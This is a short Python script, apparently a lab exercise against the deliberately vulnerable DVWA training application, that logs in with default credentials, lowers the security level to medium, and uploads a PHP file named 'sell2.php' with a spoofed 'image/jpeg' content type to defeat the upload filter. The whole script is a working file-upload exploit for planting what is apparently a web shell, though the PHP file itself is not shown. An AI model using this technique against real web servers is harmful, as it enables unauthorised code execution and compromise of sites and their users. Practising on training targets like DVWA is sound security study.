#!/usr/bin/env python

import requests


s = requests.Session()

def dvwa_login():
    url = "http://192.168.210.130/dvwa/login.php"
    params = {"username":"admin","password":"password","Login":"Login"}
    r = s.post(url, data=params)
    print('[+] Logged In.')

def dvwa_security():
    url = "http://192.168.210.130/dvwa/security.php"
    params = {"security":"medium","seclev_submit":"Submit"}
    r = s.post(url,data=params)
    print("[+] Security medium.")

def file_upload():
    url = "http://192.168.210.130/dvwa/vulnerabilities/upload/"
    #MAX_FILE_SIZE=100000&uploaded=error.png&Upload=Upload
    files = {'uploaded':('sell2.php', open('sell2.php','rb'), 'image/jpeg', {'Expires': '0'})}
    params = {"MAX_FILE_SIZE":"100000","Upload":"Upload"}
    r = s.post(url, files=files, data=params)
    if "succesfully" in r.text:
        print('[+] Upload Success!')
    else:
        print('[-] Upload failed!')


if __name__=="__main__":
    dvwa_login()
    dvwa_security()
    file_upload()
